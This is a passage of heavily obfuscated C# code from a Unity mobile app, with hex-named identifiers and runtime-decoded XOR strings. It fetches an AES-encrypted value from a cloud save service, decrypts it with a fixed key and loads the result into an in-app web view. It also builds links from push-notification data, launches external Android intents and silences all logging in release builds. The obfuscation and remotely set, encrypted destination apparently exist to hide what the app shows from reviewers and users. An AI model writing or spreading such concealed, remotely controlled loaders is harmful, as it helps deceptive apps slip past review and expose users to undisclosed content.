218, 221, 208, 207, 217, 135, 193, 193, 135, 213, 218, 148, 207, 146, 213, 210, 216, 217, 196, 243, 218, 148, 155, 204, 211, 213, 210, 200, 217, 206, 134, 156, 218, 213, 210, 217, 155, 149, 130, 129, 140, 192, 192, 207, 146, 213, 210, 216, 217, 196, 243, 218, 148, 155, 212, 211, 202, 217, 206, 134, 156, 212, 211, 202, 217, 206, 155, 149, 130, 129, 140, 149, 206, 217, 200, 201, 206, 210, 156, 199, 209, 221, 200, 223, 212, 217, 207, 134, 200, 206, 201, 217, 144, 209, 217, 216, 213, 221, 134, 205, 144, 211, 210, 223, 212, 221, 210, 219, 217, 134, 210, 201, 208, 208, 144, 221, 216, 216, 240, 213, 207, 200, 217, 210, 217, 206, 134, 218, 201, 210, 223, 200, 213, 211, 210, 148, 149, 199, 193, 144, 206, 217, 209, 211, 202, 217, 240, 213, 207, 200, 217, 210, 217, 206, 134, 218, 201, 210, 223, 200, 213, 211, 210, 148, 149, 199, 193, 144, 221, 216, 216, 249, 202, 217, 210, 200, 240, 213, 207, 200, 217, 210, 217, 206, 134, 218, 201, 210, 223, 200, 213, 211, 210, 148, 149, 199, 193, 144, 206, 217, 209, 211, 202, 217, 249, 202, 217, 210, 200, 240, 213, 207, 200, 217, 210, 217, 206, 134, 218, 201, 210, 223, 200, 213, 211, 210, 148, 149, 199, 193, 144, 216, 213, 207, 204, 221, 200, 223, 212, 249, 202, 217, 210, 200, 134, 218, 201, 210, 223, 200, 213, 211, 210, 148, 149, 199, 206, 217, 200, 201, 206, 210, 156, 218, 221, 208, 207, 217, 135, 193, 193, 135, 206, 217, 200, 201, 206, 210, 156, 211, 206, 213, 219, 148, 205, 149, 135, 193, 135, 193, 223, 221, 200, 223, 212, 148, 217, 149, 199, 193 }, 188) + _0x691e60c5._0x0bb7411d(new byte[5] { 56, 108, 109, 108, 126 }, 69);
    }

    private bool _0x696b1c49 = false;
    // MAIN FLOW
    private bool _0x63f42519 { get; set; }

    private bool _0x67b68479()
    {
        var _0xf885bb8a = _0x036c0375();
        if (_0xf885bb8a == null)
            return false;
        WLog(_0x691e60c5._0x0bb7411d(new byte[31] { 37, 12, 31, 9, 26, 12, 31, 8, 77, 15, 12, 14, 6, 77, 64, 83, 77, 29, 2, 29, 24, 29, 77, 42, 2, 47, 12, 14, 6, 87, 77 }, 109) + _0xf885bb8a.Id);
        _0xf885bb8a.GoBack();
        return true;
    }

    private ApplicationInstallMode _0x6a2fc7a7 = ApplicationInstallMode.Unknown;
    private async Task<string> _0x96d3c5f0(int _0xa99e9998 = 5, int _0x8d530c4b = 500)
    {
        try
        {
            List<EntityData> _0x29ccb898 = new List<EntityData>();
            int _0x59538767 = 0;
            do
            {
                _0x29ccb898 = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x691e60c5._0x0bb7411d(new byte[8] { 227, 255, 242, 234, 246, 225, 218, 247 }, 147), _0xb792f32e, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0xb792f32e }), new QueryOptions())).ToList();
                await Task.Delay(_0x8d530c4b);
            }
            while (_0x29ccb898.Count == 0 && _0x59538767++ < _0xa99e9998);
            {
#if B_LOGS
                {
                    Debug.Log(_0x691e60c5._0x0bb7411d(new byte[33] { 173, 162, 147, 133, 130, 171, 214, 165, 151, 128, 147, 146, 214, 186, 159, 152, 157, 214, 167, 131, 147, 132, 143, 214, 132, 147, 133, 131, 154, 130, 133, 204, 214 }, 246) + JsonConvert.SerializeObject(_0x29ccb898, Formatting.Indented));
                }
#endif
            }

            {
#if B_LOGS
                {
                    Debug.Log(_0x691e60c5._0x0bb7411d(new byte[39] { 203, 196, 245, 227, 228, 205, 176, 195, 241, 230, 245, 244, 176, 220, 249, 254, 251, 176, 193, 229, 245, 226, 233, 176, 226, 245, 227, 229, 252, 228, 227, 176, 243, 255, 229, 254, 228, 170, 176 }, 144) + _0x29ccb898.Count);
                }
#endif
            }

            var _0xc1f2c6dc = _0x29ccb898.SelectMany(_0xfe951bc6 => _0xfe951bc6.Data).FirstOrDefault(_0xceac3efc => _0xceac3efc.Key == _0xb792f32e)?.Value.GetAs<string>() ?? string.Empty;
            _0xc1f2c6dc = Decrypt(_0xc1f2c6dc, _0xb792f32e);
            {
#if B_LOGS
                {
                    Debug.Log(_0x691e60c5._0x0bb7411d(new byte[24] { 49, 62, 15, 25, 30, 55, 74, 38, 5, 11, 14, 74, 25, 11, 28, 15, 14, 74, 6, 3, 4, 1, 80, 74 }, 106) + _0xc1f2c6dc);
                }
#endif
            }

            return _0xc1f2c6dc;
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x691e60c5._0x0bb7411d(new byte[39] { 170, 165, 148, 130, 133, 172, 209, 182, 148, 133, 209, 158, 131, 209, 129, 144, 131, 130, 148, 209, 130, 144, 135, 148, 149, 209, 157, 152, 159, 154, 209, 151, 144, 152, 157, 148, 149, 203, 209 }, 241) + ex.Message);
                }
#endif
            }

            return string.Empty;
        }
    }

    private string _0x70078989 = "";
    private bool _0x4d3feca8 = false;
    private bool _0xd016fc7d = false;
    private void _0x8b7b3576()
    {
        using (var _0x769f6086 = new AndroidJavaClass(_0x691e60c5._0x0bb7411d(new byte[30] { 116, 120, 122, 57, 98, 121, 126, 99, 110, 36, 115, 57, 103, 123, 118, 110, 114, 101, 57, 66, 121, 126, 99, 110, 71, 123, 118, 110, 114, 101 }, 23)))
        using (var _0x50c78c09 = _0x769f6086.GetStatic<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[15] { 154, 140, 139, 139, 156, 151, 141, 184, 154, 141, 144, 143, 144, 141, 128 }, 249)))
        using (var _0xc2c0c153 = _0x50c78c09.Call<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[9] { 130, 128, 145, 172, 139, 145, 128, 139, 145 }, 229)))
        {
            if (_0xc2c0c153 == null)
                return;
            using (var _0xe1d3d2e3 = _0xc2c0c153.Call<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[9] { 177, 179, 162, 147, 174, 162, 164, 183, 165 }, 214)))
            {
                if (_0xe1d3d2e3 == null)
                    return;
                using (var _0x455eee16 = new AndroidJavaObject(_0x691e60c5._0x0bb7411d(new byte[19] { 96, 125, 104, 33, 101, 124, 96, 97, 33, 69, 92, 64, 65, 64, 109, 101, 106, 108, 123 }, 15)))
                using (var _0x71a2cd96 = _0xe1d3d2e3.Call<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[6] { 31, 17, 13, 39, 17, 0 }, 116)))
                using (var _0x479a3130 = _0x71a2cd96.Call<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[8] { 102, 123, 106, 125, 110, 123, 96, 125 }, 15)))
                {
                    while (_0x479a3130.Call<bool>(_0x691e60c5._0x0bb7411d(new byte[7] { 231, 238, 252, 193, 234, 247, 251 }, 143)))
                    {
                        string _0xbfcdbd2e = _0x479a3130.Call<string>(_0x691e60c5._0x0bb7411d(new byte[4] { 90, 81, 76, 64 }, 52));
                        using (var _0xe2ce0e69 = _0xe1d3d2e3.Call<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[3] { 236, 238, 255 }, 139), _0xbfcdbd2e))
                        {
                            _0x455eee16.Call<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[3] { 127, 122, 123 }, 15), _0xbfcdbd2e, _0xe2ce0e69);
                        }
                    }

                    string _0xbf240c18 = _0x455eee16.Call<string>(_0x691e60c5._0x0bb7411d(new byte[8] { 161, 186, 134, 161, 167, 188, 187, 178 }, 213));
                    if (!string.IsNullOrEmpty(_0xbf240c18))
                    {
                        _0xb53fc4a8(_0xbf240c18);
                    }
                }
            }
        }
    }

    private string _0x634c61b5 = "";
    private string Decrypt(string _0x5c31817a, string _0x3768f7aa)
    {
        try
        {
            var _0x63fdb5a6 = Convert.FromBase64String(_0x5c31817a);
            using var _0x91928fae = Aes.Create();
            _0x91928fae.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0x3768f7aa));
            var _0x062e0168 = new byte[16];
            Buffer.BlockCopy(_0x63fdb5a6, 0, _0x062e0168, 0, 16);
            _0x91928fae.IV = _0x062e0168;
            using var _0x3d430ade = new MemoryStream(_0x63fdb5a6, 16, _0x63fdb5a6.Length - 16);
            using var _0x711d144a = new CryptoStream(_0x3d430ade, _0x91928fae.CreateDecryptor(), CryptoStreamMode.Read);
            using var _0xb6211fbe = new StreamReader(_0x711d144a, Encoding.UTF8);
            return _0xb6211fbe.ReadToEnd();
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private readonly List<UniWebViewPopup> _0x16e4da3b = new List<UniWebViewPopup>();
    internal Button _0xe27aa440(string _0x30e5d900, Transform _0x341268ff)
    {
        var _0x1c7e5167 = new GameObject(_0x30e5d900 + _0x691e60c5._0x0bb7411d(new byte[3] { 119, 65, 91 }, 53), typeof(RectTransform), typeof(Image), typeof(Button));
        var _0x83923e84 = _0x1c7e5167.GetComponent<RectTransform>();
        _0x83923e84.SetParent(_0x341268ff, false);
        var _0x44ab2306 = _0x1c7e5167.GetComponent<Image>();
        _0x44ab2306.color = new Color(0.92f, 0.92f, 0.95f, 1f);
        var _0xc87fcecd = _0x1c7e5167.GetComponent<Button>();
        var _0xe128714b = _0xc87fcecd.colors;
        _0xe128714b.highlightedColor = new Color(0.85f, 0.85f, 0.9f);
        _0xe128714b.pressedColor = new Color(0.8f, 0.8f, 0.88f);
        _0xc87fcecd.colors = _0xe128714b;
        var _0x4f65a770 = new GameObject(_0x691e60c5._0x0bb7411d(new byte[4] { 237, 220, 193, 205 }, 185), typeof(RectTransform), typeof(Text));
        var _0x568c7e68 = _0x4f65a770.GetComponent<RectTransform>();
        _0x568c7e68.SetParent(_0x1c7e5167.transform, false);
        _0x568c7e68.anchorMin = Vector2.zero;
        _0x568c7e68.anchorMax = Vector2.one;
        _0x568c7e68.offsetMin = _0x568c7e68.offsetMax = Vector2.zero;
        var _0x5aa73155 = _0x4f65a770.GetComponent<Text>();
        _0x5aa73155.text = _0x30e5d900;
        _0x5aa73155.alignment = TextAnchor.MiddleCenter;
        _0x5aa73155.color = Color.black;
        _0x5aa73155.font = Resources.GetBuiltinResource<Font>(_0x691e60c5._0x0bb7411d(new byte[9] { 95, 108, 119, 127, 114, 48, 106, 106, 120 }, 30));
        _0x5aa73155.fontSize = 28;
        WLog(_0x691e60c5._0x0bb7411d(new byte[14] { 12, 61, 42, 46, 59, 42, 13, 58, 59, 59, 32, 33, 111, 104 }, 79) + _0x30e5d900 + _0x691e60c5._0x0bb7411d(new byte[1] { 123 }, 92));
        return _0xc87fcecd;
    }

    internal bool isDestroyedForce = false;
    private bool _0x07a65fa7 = false;
    private string _0xc584cbaf;
    private string _0xd51077f3 = "";
    // WEB VIEW LOGIC
    public bool _0xf3277790 { get; set; }

    private void _0x93b3992d(string _0x4745fb9c)
    {
        bool _0x0ce18b25 = !string.IsNullOrEmpty(_0x4745fb9c);
        if (_0x0ce18b25)
        {
            {
#if B_LOGS
                Debug.Log(_0x691e60c5._0x0bb7411d(new byte[13] { 77, 66, 115, 101, 98, 75, 54, 69, 126, 121, 97, 44, 54 }, 22) + _0x4745fb9c);
#endif
            }

            _0xac611204(_0x4745fb9c);
            return;
        }
        else
        {
            {
#if B_LOGS
                Debug.Log(_0x691e60c5._0x0bb7411d(new byte[39] { 176, 191, 142, 152, 159, 182, 203, 173, 138, 135, 135, 137, 138, 136, 128, 203, 9, 109, 121, 203, 172, 138, 134, 142, 203, 195, 133, 132, 203, 141, 130, 133, 138, 135, 203, 190, 185, 167, 194 }, 235));
#endif
            }

            _0xbdc7ac42();
            return;
        }
    }

    private void OnApplicationPause(bool _0x76367727)
    {
        isApplicationPause = _0x76367727;
    }

    private async Task<bool> _0xb6ff6867(int _0xecef1a31 = 5, int _0xb9764d5d = 500)
    {
        List<EntityData> _0xd8e5dac5 = new List<EntityData>();
        int _0x75832a62 = 0;
        do
        {
            try
            {
                _0xd8e5dac5 = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x691e60c5._0x0bb7411d(new byte[8] { 99, 127, 114, 106, 118, 97, 90, 119 }, 19), _0xb792f32e, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x691e60c5._0x0bb7411d(new byte[9] { 191, 165, 134, 164, 191, 160, 183, 181, 175 }, 214) }), new QueryOptions())).ToList();
            }
            catch (Exception e)
            {
                {
#if B_LOGS
                    {
                        Debug.Log(_0x691e60c5._0x0bb7411d(new byte[32] { 101, 106, 91, 77, 74, 99, 30, 79, 75, 91, 76, 71, 127, 77, 71, 80, 93, 108, 91, 77, 75, 82, 74, 77, 30, 91, 76, 76, 81, 76, 4, 30 }, 62) + e.Message);
                    }
#endif
                }
            }

            await Task.Delay(_0xb9764d5d);
        }
        while (_0xd8e5dac5.Count == 0 && _0x75832a62++ < _0xecef1a31);
        {
#if B_LOGS
            {
                Debug.Log(_0x691e60c5._0x0bb7411d(new byte[32] { 101, 106, 91, 77, 74, 99, 30, 119, 77, 110, 76, 87, 72, 95, 93, 71, 30, 111, 75, 91, 76, 71, 30, 76, 91, 77, 75, 82, 74, 77, 4, 30 }, 62) + JsonConvert.SerializeObject(_0xd8e5dac5, Formatting.Indented));
            }
#endif
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x691e60c5._0x0bb7411d(new byte[38] { 211, 220, 237, 251, 252, 213, 168, 193, 251, 216, 250, 225, 254, 233, 235, 241, 168, 217, 253, 237, 250, 241, 168, 250, 237, 251, 253, 228, 252, 251, 168, 235, 231, 253, 230, 252, 178, 168 }, 136) + _0xd8e5dac5.Count);
            }
#endif
        }

        bool _0x0baeb13c = true;
        if (_0xd8e5dac5.Count == 0)
        {
            _0x0baeb13c = false;
        }
        else
        {
            _0x0baeb13c = _0xd8e5dac5.Any(_0xfe951bc6 => _0xfe951bc6.Data.Any(IsPrivacyItemTrue));
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x691e60c5._0x0bb7411d(new byte[25] { 197, 202, 251, 237, 234, 195, 190, 215, 237, 206, 236, 247, 232, 255, 253, 231, 190, 236, 251, 237, 235, 242, 234, 164, 190 }, 158) + _0x0baeb13c);
            }
#endif
        }

        return _0x0baeb13c;
    }

    private bool _0x8dca44f1(string _0x7b749ef8)
    {
        if (string.IsNullOrEmpty(_0x7b749ef8))
            return false;
        try
        {
            using (var _0x566ebf63 = new AndroidJavaClass(_0x691e60c5._0x0bb7411d(new byte[30] { 21, 25, 27, 88, 3, 24, 31, 2, 15, 69, 18, 88, 6, 26, 23, 15, 19, 4, 88, 35, 24, 31, 2, 15, 38, 26, 23, 15, 19, 4 }, 118)))
            using (var _0x1b132d83 = _0x566ebf63.GetStatic<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[15] { 114, 100, 99, 99, 116, 127, 101, 80, 114, 101, 120, 103, 120, 101, 104 }, 17)))
            using (var _0x74591942 = _0x1b132d83.Call<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[17] { 13, 15, 30, 58, 11, 9, 1, 11, 13, 15, 39, 11, 4, 11, 13, 15, 24 }, 106)))
            using (var _0x4ce83085 = _0x74591942.Call<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[25] { 5, 7, 22, 46, 3, 23, 12, 1, 10, 43, 12, 22, 7, 12, 22, 36, 13, 16, 50, 3, 1, 9, 3, 5, 7 }, 98), _0x7b749ef8))
            {
                if (_0x4ce83085 == null)
                    return false;
                WLog(_0x691e60c5._0x0bb7411d(new byte[37] { 247, 220, 198, 219, 217, 209, 248, 221, 223, 209, 148, 216, 213, 193, 218, 215, 220, 148, 221, 218, 199, 192, 213, 216, 216, 209, 208, 148, 196, 213, 215, 223, 213, 211, 209, 142, 148 }, 180) + _0x7b749ef8);
                _0x4ce83085.Call<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[8] { 88, 93, 93, 127, 85, 88, 94, 74 }, 57), 0x10000000);
                _0x1b132d83.Call(_0x691e60c5._0x0bb7411d(new byte[13] { 108, 107, 126, 109, 107, 94, 124, 107, 118, 105, 118, 107, 102 }, 31), _0x4ce83085);
                return true;
            }
        }
        catch
        {
            return false;
        }
    }

    private void StopCurrentFailedLoad(UniWebView _0x874c0674)
    {
        _0xfdb425d5(false);
        if (_0x874c0674 == null)
            return;
        _0x874c0674.Stop();
        if (_0x874c0674.CanGoBack)
            _0x874c0674.GoBack();
    }

    private void Awake()
    {
        if (_0x206625e7 != null)
        {
            Destroy(this.gameObject);
            return;
        }

        EnhancedTouchSupport.Enable();
        Input.backButtonLeavesApp = false;
        {
#if !B_LOGS
            Debug.unityLogger.logEnabled = false;
            Application.SetStackTraceLogType(LogType.Assert, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Exception, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Warning, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Error, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Log, StackTraceLogType.None);
#endif
        }

        _0x206625e7 = gameObject.GetComponent<_0xf2129c2e>();
        DontDestroyOnLoad(gameObject);
        _0xf074aa2c = _0x1f1a6c98 = _0xd2bbde7e = "";
        _0x4c08c43a = "";
        _0xf3277790 = false;
    }

    private bool OpenUrlExternally(string _0x252ce634)
    {
        return _0x11874922(_0x252ce634);
    }

    private string _0xadc80036 = "";
    private int _0x9dc3f74c = -1;
    private string _0x87bad85f = "";
    private void OnDestroy()
    {
        StopAllCoroutines();
        _0xbdc7ac42();
    }

    private IEnumerator _0xa402857a(Dictionary<string, object> _0x7b17cee1)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x691e60c5._0x0bb7411d(new byte[30] { 210, 221, 236, 250, 253, 212, 169, 207, 236, 253, 234, 225, 169, 204, 241, 253, 251, 232, 169, 217, 252, 250, 225, 169, 205, 232, 253, 232, 179, 169 }, 137) + string.Join(_0x691e60c5._0x0bb7411d(new byte[1] { 27 }, 18), _0x7b17cee1));
#endif
            }
        }

        string _0x6504b490 = "";
        // Primary source: nested JSON under "notificationData"
        if (_0x7b17cee1 != null && _0x7b17cee1.TryGetValue(_0x691e60c5._0x0bb7411d(new byte[16] { 7, 6, 29, 0, 15, 0, 10, 8, 29, 0, 6, 7, 45, 8, 29, 8 }, 105), out var raw))
        {
            try
            {
                var _0x8758c969 = raw?.ToString();
                var _0x88f1e299 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x8758c969);
                if (_0x88f1e299 != null && _0x88f1e299.TryGetValue(_0x691e60c5._0x0bb7411d(new byte[6] { 156, 138, 129, 139, 134, 139 }, 239), out var val))
                {
                    _0x6504b490 = val?.ToString();
                }
            }
            catch (Exception e)
            {
#if B_LOGS
                Debug.LogError(_0x691e60c5._0x0bb7411d(new byte[30] { 165, 170, 155, 141, 138, 222, 174, 139, 141, 150, 163, 222, 180, 173, 177, 176, 222, 142, 159, 140, 141, 155, 222, 155, 140, 140, 145, 140, 196, 222 }, 254) + e);
#endif
            }
        }

        // Fallback: flat structure
        if (string.IsNullOrEmpty(_0x6504b490) && _0x7b17cee1 != null && _0x7b17cee1.TryGetValue(_0x691e60c5._0x0bb7411d(new byte[6] { 86, 64, 75, 65, 76, 65 }, 37), out var lab))
        {
            _0x6504b490 = lab?.ToString();
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x691e60c5._0x0bb7411d(new byte[38] { 36, 43, 26, 12, 11, 95, 47, 10, 12, 23, 34, 95, 57, 26, 11, 28, 23, 26, 27, 95, 12, 26, 17, 27, 22, 27, 95, 25, 13, 16, 18, 95, 21, 12, 16, 17, 69, 95 }, 127) + _0x6504b490);
            }
#endif
        }

        if (string.IsNullOrEmpty(_0x6504b490))
            yield break;
        {
#if B_LOGS
            {
                Debug.Log(_0x691e60c5._0x0bb7411d(new byte[38] { 152, 151, 166, 176, 183, 227, 147, 182, 176, 171, 158, 227, 148, 162, 170, 183, 227, 183, 172, 227, 172, 179, 166, 173, 227, 180, 170, 183, 171, 227, 176, 166, 173, 167, 170, 167, 249, 227 }, 195) + _0x6504b490);
            }
#endif
        }

        _0xdac302cf = _0x6504b490;
        yield return new WaitUntil(() => _0xf3277790);
        var _0x1711a303 = _0x96d3c5f0(2, 100);
        yield return new WaitUntil(() => _0x1711a303.IsCompleted);
        string _0x9a6c5b30 = _0x1711a303.Result;
        if (!string.IsNullOrEmpty(_0x9a6c5b30))
        {
            string _0x5a3b9887 = _0x681563e9(_0x9a6c5b30, _0x6504b490);
            {
#if B_LOGS
                Debug.Log(_0x691e60c5._0x0bb7411d(new byte[33] { 253, 242, 195, 213, 210, 134, 246, 211, 213, 206, 251, 134, 244, 195, 202, 201, 199, 194, 134, 241, 195, 196, 240, 207, 195, 209, 134, 209, 207, 210, 206, 156, 134 }, 166) + _0x5a3b9887);
#endif
            }

            _0x7efe16e4.Load(_0x5a3b9887);
        }
    }

    private AndroidJavaObject _0x57ed852c { get; set; }

    /* ============================= */
    /* ENCRYPT / DECRYPT             */
    /* ============================= */
    private string _0xb432f91e(string _0x0b57d6bf, string _0x95d55091)
    {
        try
        {
            using var _0x98aa0027 = Aes.Create();
            _0x98aa0027.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0x95d55091));
            _0x98aa0027.GenerateIV();
            using var _0xb01df995 = new MemoryStream();
            _0xb01df995.Write(_0x98aa0027.IV, 0, _0x98aa0027.IV.Length);
            using (var _0xf1de0c83 = new CryptoStream(_0xb01df995, _0x98aa0027.CreateEncryptor(), CryptoStreamMode.Write))
            {
                var _0xa71e7795 = Encoding.UTF8.GetBytes(_0x0b57d6bf);
                _0xf1de0c83.Write(_0xa71e7795, 0, _0xa71e7795.Length);
                _0xf1de0c83.FlushFinalBlock();
            }

            return Convert.ToBase64String(_0xb01df995.ToArray());
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private bool _0xc812295d(string _0x1da8fb57)
    {
        try
        {
            using (var _0x70fcd74c = new AndroidJavaClass(_0x691e60c5._0x0bb7411d(new byte[30] { 53, 57, 59, 120, 35, 56, 63, 34, 47, 101, 50, 120, 38, 58, 55, 47, 51, 36, 120, 3, 56, 63, 34, 47, 6, 58, 55, 47, 51, 36 }, 86)))
            using (var _0x1ffbe58d = _0x70fcd74c.GetStatic<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[15] { 5, 19, 20, 20, 3, 8, 18, 39, 5, 18, 15, 16, 15, 18, 31 }, 102)))
            using (var _0xd1029d73 = _0x1ffbe58d.Call<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[17] { 1, 3, 18, 54, 7, 5, 13, 7, 1, 3, 43, 7, 8, 7, 1, 3, 20 }, 102)))
            using (var _0xad4964d6 = new AndroidJavaClass(_0x691e60c5._0x0bb7411d(new byte[22] { 208, 223, 213, 195, 222, 216, 213, 159, 210, 222, 223, 197, 212, 223, 197, 159, 248, 223, 197, 212, 223, 197 }, 177)))
            using (var _0xb7f9050f = _0xad4964d6.CallStatic<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[8] { 225, 240, 227, 226, 244, 196, 227, 248 }, 145), _0x1da8fb57, 1))
            {
                string _0xdfbe34a5 = _0xb7f9050f.Call<string>(_0x691e60c5._0x0bb7411d(new byte[14] { 57, 59, 42, 13, 42, 44, 55, 48, 57, 27, 38, 42, 44, 63 }, 94), _0x691e60c5._0x0bb7411d(new byte[20] { 102, 118, 107, 115, 119, 97, 118, 91, 98, 101, 104, 104, 102, 101, 103, 111, 91, 113, 118, 104 }, 4));
                string _0xf5485e82 = _0xb7f9050f.Call<string>(_0x691e60c5._0x0bb7411d(new byte[10] { 64, 66, 83, 119, 70, 68, 76, 70, 64, 66 }, 39));
                _0xb7f9050f.Call<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[11] { 127, 122, 122, 93, 127, 106, 123, 121, 113, 108, 103 }, 30), _0x691e60c5._0x0bb7411d(new byte[33] { 86, 89, 83, 69, 88, 94, 83, 25, 94, 89, 67, 82, 89, 67, 25, 84, 86, 67, 82, 80, 88, 69, 78, 25, 117, 101, 120, 96, 100, 118, 117, 123, 114 }, 55));
                _0xb7f9050f.Call<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[11] { 147, 132, 140, 142, 151, 132, 164, 153, 149, 147, 128 }, 225), _0x691e60c5._0x0bb7411d(new byte[20] { 193, 209, 204, 212, 208, 198, 209, 252, 197, 194, 207, 207, 193, 194, 192, 200, 252, 214, 209, 207 }, 163));
                if (_0xb7f9050f.Call<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[15] { 42, 61, 43, 55, 52, 46, 61, 25, 59, 44, 49, 46, 49, 44, 33 }, 88), _0xd1029d73) != null)
                {
                    WLog(_0x691e60c5._0x0bb7411d(new byte[24] { 95, 116, 110, 115, 113, 121, 80, 117, 119, 121, 60, 115, 108, 121, 114, 60, 117, 114, 104, 121, 114, 104, 38, 60 }, 28) + _0x1da8fb57);
                    _0xb7f9050f.Call<AndroidJavaObject>(_0x691e60c5._0x0bb7411d(new byte[8] { 185, 188, 188, 158, 180, 185, 191, 171 }, 216), 0x10000000);
                    _0x1ffbe58d.Call(_0x691e60c5._0x0bb7411d(new byte[13] { 200, 207, 218, 201, 207, 250, 216, 207, 210, 205, 210, 207, 194 }, 187), _0xb7f9050f);
                    return true;
                }

                if (_0x8dca44f1(_0xf5485e82))
                    return true;
                if (!string.IsNullOrEmpty(_0xdfbe34a5))
                {
                    WLog(_0x691e60c5._0x0bb7411d(new byte[28] { 29, 54, 44, 49, 51, 59, 18, 55, 53, 59, 126, 55, 48, 42, 59, 48, 42, 126, 56, 63, 50, 50, 60, 63, 61, 53, 100, 126 }, 94) + _0xdfbe34a5);
                    if (_0x95c873ba(_0xdfbe34a5))
                        return _0x36b9c406(_0xdfbe34a5, _0xf5485e82);
                    return _0x11874922(_0xdfbe34a5);
                }

                WLog(_0x691e60c5._0x0bb7411d(new byte[30] { 123, 80, 74, 87, 85, 93, 116, 81, 83, 93, 24, 81, 86, 76, 93, 86, 76, 24, 86, 87, 24, 80, 89, 86, 92, 84, 93, 74, 2, 24 }, 56) + _0x1da8fb57);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x691e60c5._0x0bb7411d(new byte[26] { 212, 255, 229, 248, 250, 242, 219, 254, 252, 242, 183, 254, 249, 227, 242, 249, 227, 183, 241, 246, 254, 251, 242, 243, 173, 183 }, 151) + e.Message);
            return true;
        }
    }

    private string _0x32882548 = "";
    private void WLog(string _0x6b484745)
    {
#if B_LOGS
        {
            Debug.Log(_0x691e60c5._0x0bb7411d(new byte[7] { 63, 48, 1, 23, 16, 57, 68 }, 100) + _0x6b484745);
        }
#endif
    }

    public void _0xbdc7ac42()
    {
        isDestroyedForce = true;
        StopAllCoroutines();
        {
#if B_LOGS
            Debug.Log(_0x691e60c5._0x0bb7411d(new byte[18] { 248, 247, 198, 208, 215, 254, 131, 239, 194, 214, 205, 192, 203, 131, 228, 194, 206, 198 }, 163));
#endif
        }

        _0xb0d18c71.Instance?._0x8584beac();
        _0x36c8771a.Instance._0x710f4cde(_0x4a69945a._0xa8f07521.DEFAULT);
    }

    private string _0x1a7c48d3()
    {
        if (string.IsNullOrEmpty(_0x634c61b5) && _0x7efe16e4 != null)
            _0x634c61b5 = _0x7efe16e4.GetUserAgent();
        if (string.IsNullOrEmpty(_0x634c61b5))
            return string.Empty;
        string _0xa86a04a6 = Regex.Replace(_0x634c61b5, _0x691e60c5._0x0bb7411d(new byte[11] { 114, 93, 4, 21, 114, 93, 4, 89, 88, 114, 76 }, 46), string.Empty);
        _0xa86a04a6 = Regex.Replace(_0xa86a04a6, _0x691e60c5._0x0bb7411d(new byte[15] { 35, 12, 84, 61, 10, 22, 19, 27, 80, 36, 33, 68, 86, 34, 84 }, 127), string.Empty);
        _0xa86a04a6 = Regex.Replace(_0xa86a04a6, _0x691e60c5._0x0bb7411d(new byte[15] { 5, 54, 33, 32, 58, 60, 61, 124, 103, 15, 125, 99, 15, 32, 121 }, 83), string.Empty);
        return Regex.Replace(_0xa86a04a6, _0x691e60c5._0x0bb7411d(new byte[6] { 179, 156, 148, 221, 195, 146 }, 239), _0x691e60c5._0x0bb7411d(new byte[1] { 108 }, 76)).Trim();
    }

    internal bool IsGoogleAuthFlowUrl(string _0x14fb4a7e)
    {
        if (string.IsNullOrEmpty(_0x14fb4a7e))
            return false;
        return _0x14fb4a7e.IndexOf(_0x691e60c5._0x0bb7411d(new byte[19] { 69, 71, 71, 75, 81, 74, 80, 87, 10, 67, 75, 75, 67, 72, 65, 10, 71, 75, 73 }, 36), StringComparison.OrdinalIgnoreCase) >= 0 || _0x14fb4a7e.IndexOf(_0x691e60c5._0x0bb7411d(new byte[16] { 49, 51, 51, 63, 37, 62, 36, 35, 126, 55, 63, 63, 55, 60, 53, 126 }, 80), StringComparison.OrdinalIgnoreCase) >= 0 || _0x14fb4a7e.IndexOf(_0x691e60c5._0x0bb7411d(new byte[21] { 74, 66, 66, 74, 65, 72, 88, 94, 72, 95, 78, 66, 67, 89, 72, 67, 89, 3, 78, 66, 64 }, 45), StringComparison.OrdinalIgnoreCase) >= 0 || _0x14fb4a7e.IndexOf(_0x691e60c5._0x0bb7411d(new byte[11] { 55, 35, 36, 49, 36, 57, 51, 126, 51, 63, 61 }, 80), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private IEnumerator _0xe8ef82f9(string _0x7452c413)
    {
        if (_0x7efe16e4 != null && _0xf3277790)
            yield break;
        _0x7efe16e4 = gameObject.AddComponent<UniWebView>();
